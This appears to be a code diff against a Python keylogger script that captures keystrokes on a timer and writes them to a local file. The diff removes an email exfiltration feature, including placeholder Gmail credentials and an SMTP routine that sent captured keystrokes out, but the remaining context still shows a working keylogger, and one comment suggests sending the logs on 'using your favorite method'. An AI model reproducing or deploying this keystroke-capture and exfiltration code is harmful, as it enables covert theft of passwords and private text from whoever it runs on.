@@ -5,8 +5,6 @@ from threading import Timer
 from datetime import datetime
 
 SEND_REPORT_EVERY = 300 # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "thisisafakegmail@gmail.com"
-EMAIL_PASSWORD = "thisisafakepassword"
 
 class Keylogger:
     def __init__(self, interval, report_method="file"):
@@ -58,18 +56,6 @@ class Keylogger:
             # write the keylogs to the file
             print(self.log, file=f)
         print(f"[+] Saved Files\\{self.filename}.txt")
-
-    def sendmail(self, email, password, message):
-        # manages a connection to the SMTP server
-        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
-        # connect to the SMTP server as TLS mode ( for security )
-        server.starttls()
-        # login to the email account
-        server.login(email, password)
-        # send the actual message
-        server.sendmail(email, email, message)
-        # terminates the session
-        server.quit()
     
     def report(self):
         """
@@ -81,9 +67,7 @@ class Keylogger:
             self.end_dt = datetime.now()
             # update `self.filename`
             self.update_filename()
-            if self.report_method == "email":
-                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
-            elif self.report_method == "file":
+            if self.report_method == "file":
                 self.report_to_file()
             # if you want to print in the console, uncomment below line
             # print(f"[{self.filename}] - {self.log}")
@@ -106,9 +90,5 @@ class Keylogger:
         keyboard.wait()
 
 if __name__ == "__main__":
-    # if you want a keylogger to send to your email
-    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
-    # if you want a keylogger to record keylogs to a local file 
-    # (and then send it using your favorite method)
     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
     keylogger.start()
